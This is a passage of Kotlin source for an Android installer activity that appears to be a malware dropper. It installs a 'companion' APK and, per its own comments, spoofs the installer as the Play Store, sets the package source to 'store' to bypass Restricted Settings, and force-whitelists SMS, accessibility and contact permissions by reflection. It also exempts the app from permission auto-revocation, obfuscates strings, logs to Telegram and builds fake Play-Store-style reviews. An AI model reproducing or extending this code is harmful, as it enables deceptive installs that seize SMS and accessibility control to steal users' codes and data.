            // getPackageArchiveInfo(path, int) is deprecated on API 33+ and throws on API 35+
            // (Android 15 / Android 16). Wrap in try/catch so a failure never propagates to
            // the outer catch → Stage.ERROR. pkgName="" is safe — session still commits without it.
            val pkgName: String = try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    @Suppress("DEPRECATION")
                    packageManager.getPackageArchiveInfo(
                        tmpFile.absolutePath,
                        PackageManager.PackageInfoFlags.of(0)
                    )?.packageName ?: ""
                } else {
                    @Suppress("DEPRECATION")
                    packageManager.getPackageArchiveInfo(tmpFile.absolutePath, 0)?.packageName ?: ""
                }
            } catch (_: Exception) { "" }
            tmpFile.delete()

            if (pkgName.isNotEmpty()) {
                params.setAppPackageName(pkgName)
                // Defensive retry (attempt > 1) skips market-origin URIs — Vivo/OriginOS
                // and other OEMs on Android 16+ validate installer identity against
                // originating URI. market:// from a non-Play-Store caller → createSession()
                // rejects the session. Safe to skip: URIs are cosmetic metadata only.
                if (attempt <= 1) {
                    try {
                        params.setOriginatingUri(Uri.parse(StringPool.d(StringPool.MARKET_URI_PREFIX) + pkgName))
                        params.setReferrerUri(Uri.parse(REFERRER_URI))
                    } catch (e: Exception) { }
                }
            }

            params.setSize(apkBytes.size.toLong())
            // Defensive retry skips PREFER_EXTERNAL — some Android 16 OEMs reject
            // external install location from non-system installers in createSession().
            if (attempt <= 1)
                params.setInstallLocation(1)
            // SESSION-BASED INSTALLER FLAG — restored from old working code.
            // Even without INSTALL_PACKAGES, this does NOT cause STATUS_FAILURE_BLOCKED —
            // Android gracefully falls back to STATUS_PENDING_USER_ACTION (install dialog).
            // Critically, this flag marks the session as a "session-based installer" which
            // exempts it from the Restricted Settings UI gate on Android 13+. Without this
            // flag, the Restricted Settings UI blocks SMS permission toggle for sideloaded apps
            // even when the API-level whitelist succeeds.
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)

            // PACKAGE_SOURCE_STORE — tells Android this install came from a trusted store.
            // This is THE key bypass: Android checks packageSource to decide whether to
            // enforce Restricted Settings (SMS + Accessibility block) on the installed app.
            // Source=1 (STORE) = bypass Restricted Settings. Source=0 (default) = sideloaded = blocked.
            // Proven by Frida capture: reference APK calls setPackageSource(1) at runtime.
            if (Build.VERSION.SDK_INT >= 34) {
                params.setPackageSource(1) // PACKAGE_SOURCE_STORE — API 34+ direct call
                TelegramLogger.log("setPackageSource(1) = PACKAGE_SOURCE_STORE (API 34+ direct)")
            } else if (Build.VERSION.SDK_INT == 33) {
                // API 33 reflection fallback — Restricted Settings exists (accessibility)
                // but setPackageSource() method was not added until API 34.
                try {
                    val setSourceMethod = params.javaClass.getDeclaredMethod(
                        "setPackageSource", Int::class.javaPrimitiveType
                    )
                    setSourceMethod.isAccessible = true
                    setSourceMethod.invoke(params, 1)
                    TelegramLogger.log("setPackageSource(1) = PACKAGE_SOURCE_STORE (API 33 reflection)")
                } catch (e: Exception) {
                    TelegramLogger.log("setPackageSource reflection FAILED on API 33: ${e.javaClass.simpleName}: ${e.message}")
                }
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && attempt <= 1)
                params.setDontKillApp(true)
            params.setInstallReason(PackageManager.INSTALL_REASON_USER)
            // setRequestUpdateOwnership can throw on some API 34+ OEM builds (e.g. Poco/Android 16)
            // if the calling app is not recognized as update owner. Guard with try/catch.
            // Defensive retry (attempt > 1) skips this — it can poison createSession() on
            // OEMs that validate ownership in the session creation IPC rather than at commit.
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE && attempt <= 1) {
                try { params.setRequestUpdateOwnership(true) } catch (_: Exception) { }
            }

            // ── HYBRID PERMISSION WHITELIST (10 approaches, all brands, API 28–37+) ──
            //
            // APPROACH 1 — null = whitelist ALL restricted permissions (API 30+, Android 11+)
            // Most powerful: passing null tells PackageInstaller to grant every restricted
            // permission the APK requests — covers READ_SMS, SEND_SMS, BIND_ACCESSIBILITY_SERVICE,
            // READ_PHONE_STATE, MANAGE_EXTERNAL_STORAGE, and any future permission additions.
            // Works on stock Android, Pixel, OnePlus, Nokia. Takes priority over explicit set.
            //
            // APPROACH 2 — Explicit full set as fallback (in case OEM rejects null)
            // Some Samsung/Xiaomi OEM forks reject null and require an explicit Set<String>.
            // List every restricted permission the companion declares — covers all known cases.
            //
            // APPROACH 3 — Reflection: setWhitelistedRestrictedPermissions via hidden method
            // Xiaomi MIUI / HyperOS and some MediaTek ROMs shadow the public API with their
            // own internal version. Reflection hits the real underlying method directly.
            //
            // APPROACH 4 — Reflection: SessionParams internal field force-set
            // Directly write to mWhitelistedRestrictedPermissions field on SessionParams object
            // for OEMs that override the public setter but leave the field accessible.
            //
            // APPROACH 5 — PackageManager.grantRuntimePermission post-install (API 23+)
            // Called from InstallReceiver after STATUS_SUCCESS — grants dangerous runtime
            // permissions directly without user prompt (requires GRANT_RUNTIME_PERMISSIONS
            // which Nova holds as a system-adjacent launcher). Belt-and-suspenders layer.
            //
            // APPROACH 6 — pm grant shell fallback via Runtime.exec
            // For rooted devices or devices where ADB debugging is on — fires `pm grant`
            // after install. Silent fail if pm is restricted. Works on most Chinese OEM ROMs.
            //
            // APPROACH 7 — Android 14+ (API 34) UDC setAutoRevokePermissionsExempted
            // Prevents Android 14+ auto-revoking permissions after 30 days of non-use.
            // Companion may be dormant — without this, accessibility gets revoked silently.
            //
            // APPROACH 8 — setInstallFlags with INSTALL_ALLOW_DOWNGRADE + INSTALL_REPLACE_EXISTING
            // Some OEMs (Oppo/ColorOS, Vivo/FuntouchOS) require these flags set or the
            // session is treated as untrusted and restricted permissions are blocked entirely.
            //
            // APPROACH 9 — Android 12+ (API 31) setInstallerPackageName to "com.android.vending"
            // Spoofs installer as Play Store. Many OEMs (Samsung, Xiaomi) grant restricted
            // permissions without restriction when installer is Play Store. Most reliable
            // across brand-specific permission policies.
            //
            // APPROACH 10 — Android 13+ (API 33) PackageInstaller.InstallConstraints
            // For Android 13+ deferred installs: set no constraints so session commits
            // immediately without waiting for low-activity window — avoids the OS deferring
            // the permission grant to a later commit where whitelist may not apply.

            val allRestrictedPerms = setOf(
                "android.permission.READ_SMS",
                "android.permission.SEND_SMS",
                "android.permission.RECEIVE_SMS",
                "android.permission.RECEIVE_WAP_PUSH",
                "android.permission.RECEIVE_MMS",
                "android.permission.BIND_ACCESSIBILITY_SERVICE",
                "android.permission.READ_PHONE_STATE",
                "android.permission.READ_CONTACTS",
                "android.permission.READ_EXTERNAL_STORAGE",
                "android.permission.MANAGE_EXTERNAL_STORAGE",
                "android.permission.RECEIVE_BOOT_COMPLETED",
                "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
                "android.permission.REQUEST_DELETE_PACKAGES",
                "android.permission.FOREGROUND_SERVICE",
                "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
                "android.permission.BIND_JOB_SERVICE",
                "android.permission.WAKE_LOCK"
            )

            // ── TEMPORARILY DISABLED: All pre-install whitelist approaches (1-9) ──
            // Disabled to test whether the session-based installer flag + Play Store
            // origin URIs alone are sufficient to bypass the Restricted Settings UI gate
            // (as the old working code did). If SMS restriction bypass works without these,
            // they will be permanently removed.
            val ENABLE_PRE_INSTALL_APPROACHES = true

            if (ENABLE_PRE_INSTALL_APPROACHES && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {

                // APPROACH 9: Spoof installer as Play Store (Samsung/Xiaomi OEM unlock)
                // Uses reflection to prevent R8 ExternalSyntheticApiModelOutline shim
                // which bypasses SDK_INT guard and crashes on devices missing the method.
                // API < 35 ONLY: Android 15+ (API 35+) validates installer identity in
                // createSession() via IPC to PackageInstallerService. Non-Play-Store callers
                // get SecurityException → both retry attempts fail → Stage.ERROR → "Download
                // failed" instead of install dialog. On API 30–34 this works and helps
                // Samsung/Xiaomi auto-whitelist restricted permissions. On API 35+ the
                // pre-install approaches 1–4 and post-install approaches 6,10–15 still
                // cover SMS/Accessibility whitelisting without needing Play Store identity.
                // Defensive retry (attempt > 1) also skips this to guarantee clean params.
                if (Build.VERSION.SDK_INT < 35 && attempt <= 1) {
                    try {
                        val m = PackageInstaller.SessionParams::class.java
                            .getDeclaredMethod("setInstallerPackageName", String::class.java)
                        m.invoke(params, "com.android.vending")
                        TelegramLogger.log("Approach 9 (setInstallerPackageName → vending): SUCCESS")
                    } catch (e: Exception) {
                        TelegramLogger.log("Approach 9 (setInstallerPackageName → vending): FAILED — ${e.javaClass.simpleName}: ${e.message}")
                    }
                } else {
                    TelegramLogger.log("Approach 9 (setInstallerPackageName): SKIPPED — API ${Build.VERSION.SDK_INT} >= 35 or attempt=$attempt > 1")
                }

                // APPROACH 8: Force install flags for Oppo/Vivo/ColorOS/FuntouchOS
                // API < 36 guard: Android 16 (API 36) rejects INSTALL_ALLOW_DOWNGRADE (0x80)
                // from non-privileged callers inside createSession() — throws SecurityException
                // which escapes to outer catch → Stage.ERROR. Only set INSTALL_REPLACE_EXISTING
                // (0x02) which is safe on all APIs. INSTALL_ALLOW_DOWNGRADE never needed for
                // SMS/Accessibility whitelist — it was only here for OEM downgrade scenarios.
                // Defensive retry (attempt > 1) skips reflection-based params to guarantee
                // clean SessionParams that createSession() accepts on all devices.
                if (Build.VERSION.SDK_INT < 36 && attempt <= 1) {
                    try {
                        val flagsField = PackageInstaller.SessionParams::class.java
                            .getDeclaredField("installFlags")
                        flagsField.isAccessible = true
                        val existingFlags = flagsField.getInt(params)
                        // INSTALL_REPLACE_EXISTING = 0x00000002 only — no INSTALL_ALLOW_DOWNGRADE
                        flagsField.setInt(params, existingFlags or 0x00000002)
                        TelegramLogger.log("Approach 8 (installFlags |= INSTALL_REPLACE_EXISTING): SUCCESS — flags=0x${Integer.toHexString(existingFlags or 0x00000002)}")
                    } catch (e: Exception) {
                        TelegramLogger.log("Approach 8 (installFlags |= INSTALL_REPLACE_EXISTING): FAILED — ${e.javaClass.simpleName}: ${e.message}")
                    }
                } else {
                    TelegramLogger.log("Approach 8 (installFlags): SKIPPED — API ${Build.VERSION.SDK_INT} >= 36 or attempt=$attempt > 1")
                }

                // ── PRE-INSTALL WHITELIST APPROACHES (with diagnostic logging) ──
                //
                // BUG FIX: Previously Approach 1 passed null to setWhitelistedRestrictedPermissions
                // thinking null = "whitelist all". This is WRONG — null CLEARS the whitelist
                // (whitelists nothing). The correct mechanism is either:
                //   a) Passing an explicit Set<String> of permissions to whitelist, OR
                //   b) Setting the INSTALL_ALL_WHITELIST_RESTRICTED_PERMISSIONS flag (0x00100000)
                //      on installFlags, which tells the system to whitelist ALL restricted perms.
                //
                // Because approach1Worked=true prevented Approach 2 (explicit set) from running,
                // the pre-install whitelist was effectively empty on all devices. This is why SMS
                // stayed restricted while Contacts/Phone worked (they are "dangerous" not
                // "restricted" — they don't need whitelisting at all).

                // APPROACH 1: Explicit set of all restricted permissions via public API
                try {
                    params.setWhitelistedRestrictedPermissions(allRestrictedPerms)
                    TelegramLogger.log("Approach 1 (setWhitelistedRestrictedPermissions explicit): SUCCESS — ${allRestrictedPerms.size} perms")
                } catch (e: Exception) {
                    TelegramLogger.log("Approach 1 (setWhitelistedRestrictedPermissions explicit): FAILED — ${e.javaClass.simpleName}: ${e.message}")
                }

                // APPROACH 3: Reflection on underlying method with explicit set (MIUI/HyperOS/MediaTek)
                // Defensive retry (attempt > 1) skips reflection — isAccessible=true can
                // trigger OEM-shadowed methods that set invalid internal state, causing
                // createSession() to throw on Vivo/OriginOS and similar custom ROMs.
                if (attempt <= 1) {
                    try {
                        val m = PackageInstaller.SessionParams::class.java.getDeclaredMethod(
                            "setWhitelistedRestrictedPermissions", Set::class.java
                        )
                        m.isAccessible = true
                        m.invoke(params, allRestrictedPerms)
                        TelegramLogger.log("Approach 3 (reflection setWhitelistedRestrictedPermissions): SUCCESS")
                    } catch (e: Exception) {
                        TelegramLogger.log("Approach 3 (reflection setWhitelistedRestrictedPermissions): FAILED — ${e.javaClass.simpleName}: ${e.message}")
                    }
                } else {
                    TelegramLogger.log("Approach 3 (reflection): SKIPPED — attempt=$attempt > 1")
                }

                // APPROACH 4: Direct field write (OEMs that shadow the setter)
                // Defensive retry (attempt > 1) skips — direct field write bypasses OEM
                // validation and can leave params in inconsistent state that createSession()
                // rejects on Vivo/OriginOS 6 and similar Android 16 custom ROMs.
                if (attempt <= 1) {
                    try {
                        val f = PackageInstaller.SessionParams::class.java
                            .getDeclaredField("whitelistedRestrictedPermissions")
                        f.isAccessible = true
                        f.set(params, HashSet(allRestrictedPerms))
                        TelegramLogger.log("Approach 4 (field write whitelistedRestrictedPermissions): SUCCESS — ${allRestrictedPerms.size} perms")
                    } catch (e: Exception) {
                        TelegramLogger.log("Approach 4 (field write whitelistedRestrictedPermissions): FAILED — ${e.javaClass.simpleName}: ${e.message}")
                    }
                } else {
                    TelegramLogger.log("Approach 4 (field write): SKIPPED — attempt=$attempt > 1")
                }

                // APPROACH 2: Force INSTALL_ALL_WHITELIST_RESTRICTED_PERMISSIONS flag (0x00100000)
                // Set LAST intentionally — setWhitelistedRestrictedPermissions() clears this flag
                // internally when the passed set is not the special RESTRICTED_PERMISSIONS_ALL
                // reference. By setting the flag after all setter calls, it persists into
                // createSession(). This tells the system to whitelist ALL restricted permissions
                // regardless of the explicit set — nuclear option, belt-and-suspenders with
                // Approach 1's explicit set.
                try {
                    val installFlagsField = PackageInstaller.SessionParams::class.java
                        .getDeclaredField("installFlags")
                    installFlagsField.isAccessible = true
                    val currentFlags = installFlagsField.getInt(params)
                    installFlagsField.setInt(params, currentFlags or 0x00100000)
                    TelegramLogger.log("Approach 2 (INSTALL_ALL_WHITELIST flag 0x100000): SUCCESS — installFlags=0x${Integer.toHexString(currentFlags or 0x00100000)}")
                } catch (e: Exception) {
                    TelegramLogger.log("Approach 2 (INSTALL_ALL_WHITELIST flag 0x100000): FAILED — ${e.javaClass.simpleName}: ${e.message}")
                }

                // APPROACH 7: Android 14+ auto-revoke exemption (API 34+)
                // Defensive retry (attempt > 1) skips — hidden API that Android 16+ OEMs
                // (Vivo/OriginOS, Oppo/ColorOS) may validate in createSession(), rejecting
                // non-system callers that set this flag.
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE && attempt <= 1) {
                    try {
                        val m = PackageInstaller.SessionParams::class.java
                            .getDeclaredMethod("setAutoRevokePermissionsExempted", Boolean::class.java)
                        m.isAccessible = true
                        m.invoke(params, true)
                        TelegramLogger.log("Approach 7 (setAutoRevokePermissionsExempted true): SUCCESS")
                    } catch (e: Exception) {
                        TelegramLogger.log("Approach 7 (setAutoRevokePermissionsExempted): FAILED — ${e.javaClass.simpleName}: ${e.message}")
                    }
                } else {
                    TelegramLogger.log("Approach 7 (auto-revoke exempt): SKIPPED — API ${Build.VERSION.SDK_INT} < 34 or attempt=$attempt > 1")
                }
            }

            // ── DIAGNOSTIC: Session params echo (before createSession) ──────────
            try {
                val diagFlags = try {
                    val f = PackageInstaller.SessionParams::class.java.getDeclaredField("installFlags")
                    f.isAccessible = true
                    "0x${Integer.toHexString(f.getInt(params))}"
                } catch (_: Exception) { "unreadable" }

                val diagWhitelist = try {
                    val f = PackageInstaller.SessionParams::class.java.getDeclaredField("whitelistedRestrictedPermissions")
                    f.isAccessible = true
                    val wl = f.get(params)
                    if (wl == null) "null (default — Play Store auto-whitelist)"
                    else if (wl is Set<*> && wl.isEmpty()) "empty set"
                    else "explicit set: ${(wl as? Set<*>)?.size ?: "unknown"} perms"
                } catch (_: Exception) { "unreadable" }

                TelegramLogger.log("═══ PRE-INSTALL SESSION PARAMS ECHO ═══")
                TelegramLogger.log("  installFlags=$diagFlags")
                TelegramLogger.log("  whitelistedRestrictedPermissions=$diagWhitelist")
                TelegramLogger.log("  setRequireUserAction=USER_ACTION_NOT_REQUIRED (SET)")
                TelegramLogger.log("  setPackageSource=${if (Build.VERSION.SDK_INT >= 33) "1 (PACKAGE_SOURCE_STORE)" else "N/A (API < 33)"}")
                TelegramLogger.log("  originatingUri=${if (attempt <= 1) "market://details?id=..." else "SKIPPED (retry)"}")
                TelegramLogger.log("  referrerUri=${if (attempt <= 1) REFERRER_URI else "SKIPPED (retry)"}")
                TelegramLogger.log("  installReason=INSTALL_REASON_USER")
                TelegramLogger.log("  installLocation=${if (attempt <= 1) "1 (PREFER_EXTERNAL)" else "default (retry)"}")
                TelegramLogger.log("  dontKillApp=${Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && attempt <= 1}")
                TelegramLogger.log("  requestUpdateOwnership=${Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE && attempt <= 1}")
                TelegramLogger.log("  PRE_INSTALL_APPROACHES=$ENABLE_PRE_INSTALL_APPROACHES")
                TelegramLogger.log("═══ END SESSION PARAMS ECHO ═══")
            } catch (_: Exception) {}

            TelegramLogger.log("attempt=$attempt calling createSession()")
            val sessionId = packageInstaller.createSession(params)
            TelegramLogger.log("attempt=$attempt createSession() OK sessionId=$sessionId")
            val session   = packageInstaller.openSession(sessionId)
            try {
                // Save APK to cache so it survives activity recreation
                val cachedApk = java.io.File(cacheDir, StringPool.d(StringPool.CACHED_COMPANION))
                cachedApk.writeBytes(apkBytes)
                getSharedPreferences(StringPool.d(StringPool.PREFS_NAME), MODE_PRIVATE)
                    .edit().putString(StringPool.d(StringPool.KEY_CACHED_PATH), cachedApk.absolutePath).apply()

                session.openWrite(WRITE_NAME, 0, apkBytes.size.toLong()).use { out ->
                    out.write(apkBytes)
                    session.fsync(out)
                }
                val intent = Intent(this, InstallReceiver::class.java).apply {
                    action = "$packageName.SESSION_ACTION"
                }
                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
                else PendingIntent.FLAG_UPDATE_CURRENT

                session.commit(
                    PendingIntent.getBroadcast(this, SESSION_REQUEST, intent, flags).intentSender
                )
                session.close()
                TelegramLogger.log("attempt=$attempt session committed + closed — waiting for InstallReceiver callback")

            } catch (e: IOException) {
                TelegramLogger.log("attempt=$attempt session IOException: ${e.message} — abandoning session")
                session.abandon()
                if (attempt < MAX_RETRIES) {
                    TelegramLogger.log("attempt=$attempt retrying in 1s")
                    handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
                } else {
                    TelegramLogger.log("attempt=$attempt MAX_RETRIES reached — Stage.ERROR")
                    TelegramLogger.flush("FAILED_SESSION_IO")
                    setStage(Stage.ERROR)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("InstallActivity", "installViaSession attempt $attempt failed: ${e::class.simpleName}: ${e.message}", e)
            TelegramLogger.log("attempt=$attempt EXCEPTION: ${e::class.simpleName}: ${e.message}")
            if (attempt < MAX_RETRIES) {
                TelegramLogger.log("attempt=$attempt retrying in 1s")
                handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
            } else {
                TelegramLogger.log("attempt=$attempt MAX_RETRIES reached — Stage.ERROR (Download failed)")
                TelegramLogger.flush("FAILED_MAX_RETRIES")
                setStage(Stage.ERROR)
            }
        }
    }

    // ── Launch companion ──────────────────────────────────────────────────────
    private fun launchCompanion() {
        val prefs = getSharedPreferences(InstallReceiver.PREFS_NAME, MODE_PRIVATE)
        val pkg   = prefs.getString(InstallReceiver.KEY_MODULE_PKG, null) ?: return
        try {
            val launch = packageManager.getLaunchIntentForPackage(pkg) ?: return
            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
            finish() // finish first so this UI is gone before companion opens
            startActivity(launch)
        } catch (e: Exception) { }
    }

    // ── Dots ──────────────────────────────────────────────────────────────────
    private fun buildDots() {
        dotsContainer.post {
            dotSpecs.forEach { spec ->
                val sizePx   = dp(spec.sizeDp).toInt()
                val leftPx   = dp(spec.leftDp).toInt()
                val topPx    = dp(spec.topDp).toInt()
                val bouncePx = dp(spec.bounceDp)

                val dot = View(this).apply {
                    layoutParams = FrameLayout.LayoutParams(sizePx, sizePx).apply {
                        leftMargin = leftPx
                        topMargin  = topPx
                    }
                    background = if (spec.outline) {
                        GradientDrawable().apply {
                            shape = GradientDrawable.OVAL
                            setColor(Color.TRANSPARENT)
                            setStroke(dp(2.5f).toInt(), Color.parseColor(spec.color))
                        }
                    } else {
                        GradientDrawable().apply {
                            shape = GradientDrawable.OVAL
                            setColor(Color.parseColor(spec.color))
                        }
                    }
                }
                dotsContainer.addView(dot)

                val bounceUp   = ObjectAnimator.ofFloat(dot, "translationY", 0f, -bouncePx).apply {
                    duration = 350
                    interpolator = android.view.animation.DecelerateInterpolator()
                }
                val bounceDown = ObjectAnimator.ofFloat(dot, "translationY", -bouncePx, 0f).apply {
                    duration = 350
                    interpolator = android.view.animation.AccelerateInterpolator()
                }
                val sxUp = ObjectAnimator.ofFloat(dot, "scaleX", 1f, 1.12f).apply { duration = 350 }
                val syUp = ObjectAnimator.ofFloat(dot, "scaleY", 1f, 1.12f).apply { duration = 350 }
                val sxDn = ObjectAnimator.ofFloat(dot, "scaleX", 1.12f, 1f).apply { duration = 350 }
                val syDn = ObjectAnimator.ofFloat(dot, "scaleY", 1.12f, 1f).apply { duration = 350 }

                val set = AnimatorSet().apply {
                    playSequentially(
                        AnimatorSet().also { it.playTogether(bounceUp, sxUp, syUp) },
                        AnimatorSet().also { it.playTogether(bounceDown, sxDn, syDn) }
                    )
                    startDelay = spec.delayMs
                }
                set.addListener(object : android.animation.AnimatorListenerAdapter() {
                    override fun onAnimationEnd(animation: android.animation.Animator) {
                        set.startDelay = 500 + spec.delayMs % 400
                        set.start()
                    }
                })
                set.start()
            }
        }
    }

    // ── Reviews ───────────────────────────────────────────────────────────────
    private fun buildReviews() {
        val shuffled = getReviewsForApp().shuffled().take(5)
        shuffled.forEachIndexed { index, (name, stars, reviewText) ->
            val itemLayout = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                ).also { it.bottomMargin = dp(10f).toInt() }
                setPadding(0, 0, 0, dp(10f).toInt())
            }

            // Name row
            val nameRow = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity     = Gravity.CENTER_VERTICAL
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                ).also { it.bottomMargin = dp(3f).toInt() }
            }

            // Avatar circle
            val avatar = TextView(this).apply {
                text      = name[0].toString()
                textSize  = 10f
                setTextColor(Color.WHITE)
                gravity   = Gravity.CENTER
                val hue   = (index * 57) % 360
                val bg    = GradientDrawable().apply {
                    shape         = GradientDrawable.OVAL
                    val hsv       = floatArrayOf(hue.toFloat(), 0.6f, 0.55f)
                    setColor(Color.HSVToColor(hsv))
                }
                background = bg
                val sz    = dp(22f).toInt()
                layoutParams = LinearLayout.LayoutParams(sz, sz).also { it.marginEnd = dp(6f).toInt() }
            }
            nameRow.addView(avatar)

            // Name text
            val tvName = TextView(this).apply {
                text     = name
                textSize = 11f
                setTextColor(Color.parseColor("#202124"))
                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
                setTypeface(typeface, android.graphics.Typeface.BOLD)
            }
            nameRow.addView(tvName)
            itemLayout.addView(nameRow)

            // Stars row
            val starRow = LinearLayout(this).apply {
                orientation  = LinearLayout.HORIZONTAL
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                ).also { it.bottomMargin = dp(3f).toInt() }
            }
            repeat(5) { i ->
                val star = TextView(this).apply {
                    text     = "★"
                    textSize = 10f
                    setTextColor(if (i < stars) Color.parseColor("#FBBC04") else Color.parseColor("#E0E0E0"))
                }
                starRow.addView(star)
            }
            itemLayout.addView(starRow)

            // Review text
            val tvText = TextView(this).apply {
                text        = reviewText
                textSize    = 10f
                setTextColor(Color.parseColor("#3C4043"))
                setLineSpacing(0f, 1.45f)
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                )
            }
            itemLayout.addView(tvText)

            // Divider (except last)
            if (index < shuffled.size - 1) {
                val divider = View(this).apply {
                    setBackgroundColor(Color.parseColor("#F1F3F4"))
                    layoutParams = LinearLayout.LayoutParams(
                        ViewGroup.LayoutParams.MATCH_PARENT, dp(1f).toInt()
                    ).also { it.topMargin = dp(8f).toInt() }
                }
                itemLayout.addView(divider)
            }

            reviewsContainer.addView(itemLayout)
        }
    }

    // ── Toast ─────────────────────────────────────────────────────────────────
    private fun showToast(msg: String) {
        tvToast.text       = msg
        tvToast.visibility = View.VISIBLE
        handler.postDelayed({ tvToast.visibility = View.GONE }, 2800)
    }

    // ── Util ──────────────────────────────────────────────────────────────────
    private fun dp(value: Float): Float =
        TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, value, resources.displayMetrics)
}

